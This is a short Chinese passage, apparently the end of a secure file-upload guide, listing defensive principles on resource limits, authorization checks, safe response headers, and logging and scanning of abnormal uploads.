限制资源：控制文件大小、数量、上传频率和解压后的资源消耗。

严格授权：验证用户是否有权上传、查看、下载和删除对应文件。

安全响应：根据业务需要设置正确的响应类型、下载策略及其他浏览器安全策略。

记录与监控：记录异常上传行为，并对文件进行必要的安全检测。
